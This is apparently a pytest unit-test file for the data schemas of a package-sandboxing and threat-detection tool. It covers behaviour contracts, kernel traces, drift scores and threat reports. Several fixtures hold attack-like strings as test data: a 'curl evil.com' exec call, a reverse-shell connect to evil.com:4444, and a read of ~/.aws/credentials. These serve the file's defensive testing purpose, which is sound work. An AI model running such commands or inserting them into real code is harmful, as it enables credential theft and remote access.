"""Unit tests for Block 1: core/schema.

Tests model validation, JSON serialization/deserialization, Ollama JSON schema emission,
Set operations, fail-closed zero-trust contracts, and lifecycle enums.
"""

import json
import pytest
from pydantic import ValidationError

from core.schema import (
    ExpectedBehaviorContract,
    RiskLevel,
    ObservedKernelTrace,
    EcosystemType,
    LifecycleHookType,
    ASTSuspiciousToken,
    ExtractionContext,
    SecurityDimension,
    SeverityLevel,
    ViolationRecord,
    DriftResult,
    ThreatAttributionReport,
    ExecutionState,
    VerdictState,
)


# =====================================================================
# 1. ExpectedBehaviorContract Tests
# =====================================================================

def test_ebc_valid_instantiation():
    """Verify that ExpectedBehaviorContract can be instantiated with valid fields."""
    contract = ExpectedBehaviorContract(
        package_name="test-pkg",
        purpose="A mathematical helper library",
        network_required=False,
        allowed_domains=[],
        allowed_read_prefixes=["/tmp/test"],
        allowed_write_prefixes=["/tmp/test"],
        allowed_binaries=["node"],
        accesses_user_credentials=False,
        risk_level_assessment=RiskLevel.LOW.value,
    )
    assert contract.package_name == "test-pkg"
    assert contract.purpose == "A mathematical helper library"
    assert contract.network_required is False
    assert contract.allowed_domains == []
    assert contract.allowed_read_prefixes == ["/tmp/test"]
    assert contract.allowed_binaries == ["node"]
    assert contract.accesses_user_credentials is False
    assert contract.risk_level_assessment == "LOW"


def test_ebc_defaults():
    """Verify default values for optional lists and flags."""
    contract = ExpectedBehaviorContract(
        package_name="minimal-pkg",
        purpose="Minimal purpose description",
        network_required=True,
    )
    assert contract.allowed_domains == []
    assert contract.allowed_read_prefixes == []
    assert contract.allowed_write_prefixes == []
    assert contract.allowed_binaries == []
    assert contract.accesses_user_credentials is False
    assert contract.risk_level_assessment == "LOW"


def test_ebc_missing_required_fields():
    """Verify ValidationError is raised when required fields are missing."""
    with pytest.raises(ValidationError) as exc_info:
        ExpectedBehaviorContract(package_name="incomplete-pkg")
    errors = exc_info.value.errors()
    missing_fields = {e["loc"][0] for e in errors}
    assert "purpose" in missing_fields
    assert "network_required" in missing_fields


def test_ebc_json_schema_export():
    """Verify that model_json_schema emits valid schema conforming to Ollama specs."""
    schema = ExpectedBehaviorContract.model_json_schema()
    assert schema["type"] == "object"
    assert "properties" in schema
    assert "required" in schema

    required_fields = set(schema["required"])
    assert "package_name" in required_fields
    assert "purpose" in required_fields
    assert "network_required" in required_fields

    props = schema["properties"]
    assert props["package_name"]["type"] == "string"
    assert props["network_required"]["type"] == "boolean"
    assert props["allowed_domains"]["type"] == "array"
    assert props["accesses_user_credentials"]["type"] == "boolean"


def test_ebc_roundtrip_json_serialization():
    """Verify lossless serialization and deserialization via JSON."""
    contract = ExpectedBehaviorContract(
        package_name="network-pkg",
        purpose="Fetches remote dependencies",
        network_required=True,
        allowed_domains=["api.example.com"],
        allowed_read_prefixes=["/usr/lib"],
        allowed_write_prefixes=["/tmp"],
        allowed_binaries=["curl", "tar"],
        accesses_user_credentials=False,
        risk_level_assessment="MEDIUM",
    )
    raw_json = contract.model_dump_json()
    reconstructed = ExpectedBehaviorContract.model_validate_json(raw_json)
    assert reconstructed == contract
    assert reconstructed.allowed_domains == ["api.example.com"]
    assert reconstructed.allowed_binaries == ["curl", "tar"]


def test_ebc_zero_trust_fallback():
    """Verify that zero_trust_fallback creates a strict, fail-closed contract."""
    fallback = ExpectedBehaviorContract.zero_trust_fallback("untrusted-lib")
    assert fallback.package_name == "untrusted-lib"
    assert fallback.network_required is False
    assert fallback.allowed_domains == []
    assert fallback.allowed_read_prefixes == []
    assert fallback.allowed_write_prefixes == []
    assert fallback.allowed_binaries == []
    assert fallback.accesses_user_credentials is False
    assert fallback.risk_level_assessment == "HIGH"


# =====================================================================
# 2. ObservedKernelTrace Tests
# =====================================================================

def test_observed_kernel_trace_instantiation():
    """Verify ObservedKernelTrace defaults and custom values."""
    trace = ObservedKernelTrace(
        files_read={"/etc/hosts", "/proc/cpuinfo"},
        files_written={"/tmp/build.log"},
        network_endpoints={"194.26.29.112:443"},
        spawned_binaries={"node", "sh"},
        timed_out=False,
        execution_duration_ms=125.5,
    )
    assert "/etc/hosts" in trace.files_read
    assert "/tmp/build.log" in trace.files_written
    assert "194.26.29.112:443" in trace.network_endpoints
    assert "node" in trace.spawned_binaries
    assert trace.timed_out is False
    assert trace.execution_duration_ms == 125.5


def test_observed_kernel_trace_defaults():
    """Verify default empty sets and baseline timing attributes."""
    trace = ObservedKernelTrace()
    assert trace.files_read == set()
    assert trace.files_written == set()
    assert trace.network_endpoints == set()
    assert trace.spawned_binaries == set()
    assert trace.timed_out is False
    assert trace.execution_duration_ms == 0.0


def test_observed_kernel_trace_set_deduplication():
    """Verify that duplicates in telemetry are automatically deduplicated by Set."""
    trace = ObservedKernelTrace(
        files_read={"/etc/passwd", "/etc/passwd", "/etc/passwd"},
        spawned_binaries={"bash", "bash", "python3"},
    )
    assert len(trace.files_read) == 1
    assert len(trace.spawned_binaries) == 2


def test_observed_kernel_trace_json_roundtrip():
    """Verify that Set attributes serialize to JSON arrays and deserialize back to sets."""
    trace = ObservedKernelTrace(
        files_read={"/a", "/b"},
        network_endpoints={"1.2.3.4:80"},
        execution_duration_ms=42.0,
    )
    raw_json = trace.model_dump_json()
    data = json.loads(raw_json)
    assert isinstance(data["files_read"], list)

    reconstructed = ObservedKernelTrace.model_validate_json(raw_json)
    assert isinstance(reconstructed.files_read, set)
    assert reconstructed.files_read == {"/a", "/b"}
    assert reconstructed.network_endpoints == {"1.2.3.4:80"}


# =====================================================================
# 3. Extraction & AST Models Tests
# =====================================================================

def test_ast_suspicious_token():
    """Verify ASTSuspiciousToken fields and optional entropy score."""
    token = ASTSuspiciousToken(
        token_type="CallExpression",
        identifier="child_process.exec",
        line_number=42,
        snippet="child_process.exec('curl evil.com')",
        entropy_score=4.85,
    )
    assert token.token_type == "CallExpression"
    assert token.identifier == "child_process.exec"
    assert token.line_number == 42
    assert token.entropy_score == 4.85

    token_no_entropy = ASTSuspiciousToken(
        token_type="ImportFrom",
        identifier="subprocess",
        line_number=1,
        snippet="import subprocess",
    )
    assert token_no_entropy.entropy_score is None


def test_extraction_context():
    """Verify ExtractionContext with nested AST tokens and enums."""
    ctx = ExtractionContext(
        package_name="express-mock",
        version="4.18.2",
        ecosystem=EcosystemType.NPM,
        declared_description="Mock Express framework",
        repository_url="https://github.com/expressjs/express",
        dependencies=["accepts", "bytes"],
        hook_type=LifecycleHookType.POSTINSTALL,
        hook_command="node ./scripts/postinstall.js",
        source_code="console.log('installed');",
        ast_tokens=[
            ASTSuspiciousToken(
                token_type="CallExpression",
                identifier="console.log",
                line_number=1,
                snippet="console.log('installed')",
            )
        ],
        runner_script_path="/tmp/.sysdrift_postinstall.sh",
    )
    assert ctx.ecosystem == EcosystemType.NPM
    assert ctx.hook_type == LifecycleHookType.POSTINSTALL
    assert len(ctx.ast_tokens) == 1
    assert ctx.dependencies == ["accepts", "bytes"]

    raw_json = ctx.model_dump_json()
    reconstructed = ExtractionContext.model_validate_json(raw_json)
    assert reconstructed == ctx


# =====================================================================
# 4. Arbitration & Drift Result Tests
# =====================================================================

def test_arbitration_models():
    """Verify ViolationRecord and DriftResult models and score validation."""
    violation = ViolationRecord(
        dimension=SecurityDimension.NETWORK,
        severity=SeverityLevel.CRITICAL.value,
        description="Unauthorized network connection to 194.26.29.112:443",
        offending_artifact="194.26.29.112:443",
    )
    assert violation.dimension == SecurityDimension.NETWORK
    assert violation.severity == "CRITICAL"

    drift = DriftResult(
        composite_drift_score=0.80,
        network_drift=1.0,
        filesystem_drift=0.5,
        process_drift=0.0,
        is_quarantined=True,
        violations=[violation],
    )
    assert drift.composite_drift_score == 0.80
    assert drift.is_quarantined is True
    assert len(drift.violations) == 1


def test_drift_score_bounds_validation():
    """Verify that drift scores outside [0.0, 1.0] raise ValidationError."""
    with pytest.raises(ValidationError):
        DriftResult(
            composite_drift_score=1.5,  # Out of range
            network_drift=0.0,
            filesystem_drift=0.0,
            process_drift=0.0,
            is_quarantined=True,
        )

    with pytest.raises(ValidationError):
        DriftResult(
            composite_drift_score=0.5,
            network_drift=-0.1,  # Out of range
            filesystem_drift=0.0,
            process_drift=0.0,
            is_quarantined=True,
        )


# =====================================================================
# 5. Threat Attribution & Forensics Tests
# =====================================================================

def test_threat_attribution_report():
    """Verify ThreatAttributionReport fields, validation, and serialization."""
    report = ThreatAttributionReport(
        threat_score=0.85,
        attack_category="Credential Harvesting",
        mitre_attack_tactics=["T1552.001", "T1071.001"],
        culprit_code_snippet="open(os.path.expanduser('~/.aws/credentials'))",
        executive_summary="The package extracted cloud credentials and exfiltrated them.",
        remediation_recommendations=["Quarantine package", "Rotate AWS keys"],
    )
    assert report.threat_score == 0.85
    assert report.attack_category == "Credential Harvesting"
    assert report.mitre_attack_tactics == ["T1552.001", "T1071.001"]
    assert report.mitre_tactics == ["T1552.001", "T1071.001"]
    assert report.culprit_code_snippet == "open(os.path.expanduser('~/.aws/credentials'))"
    assert report.suspect_ast_nodes == ["open(os.path.expanduser('~/.aws/credentials'))"]
    assert report.remediation_recommendations == ["Quarantine package", "Rotate AWS keys"]
    assert report.remediation_steps == ["Quarantine package", "Rotate AWS keys"]


def test_threat_attribution_report_dual_spec_aliases():
    """Verify that ThreatAttributionReport can be instantiated with TRD field names."""
    report = ThreatAttributionReport(
        threat_score=0.90,
        attack_category="Reverse Shell",
        mitre_tactics=["T1059.004"],
        suspect_ast_nodes="socket.connect(('evil.com', 4444))",
        executive_summary="Attempted interactive reverse shell spawn.",
        remediation_steps=["Block host", "Review audit logs"],
    )
    assert report.mitre_attack_tactics == ["T1059.004"]
    assert report.culprit_code_snippet == "socket.connect(('evil.com', 4444))"
    assert report.remediation_recommendations == ["Block host", "Review audit logs"]


def test_threat_attribution_score_bounds():
    """Verify threat_score is constrained to [0.0, 1.0]."""
    with pytest.raises(ValidationError):
        ThreatAttributionReport(
            threat_score=1.2,
            attack_category="Exfiltration",
            executive_summary="Test",
        )


# =====================================================================
# 6. State Machine & Verdict Enums Tests
# =====================================================================

def test_execution_state_members():
    """Verify all lifecycle execution state enum members."""
    expected = {
        "IDLE",
        "INGESTING",
        "SYNTHESIZING_CONTRACT",
        "SANDBOXING",
        "ARBITRATING",
        "ATTRIBUTING_FORENSICS",
        "COMPLETED",
        "FAILED",
    }
    actual = {s.value for s in ExecutionState}
    assert actual == expected


def test_verdict_state_and_exit_codes():
    """Verify verdict states and corresponding standard POSIX exit codes."""
    assert VerdictState.ALLOW.value == "ALLOW"
    assert VerdictState.ALLOW.exit_code == 0

    assert VerdictState.QUARANTINE.value == "QUARANTINE"
    assert VerdictState.QUARANTINE.exit_code == 1

    assert VerdictState.ERROR.value == "ERROR"
    assert VerdictState.ERROR.exit_code == 2
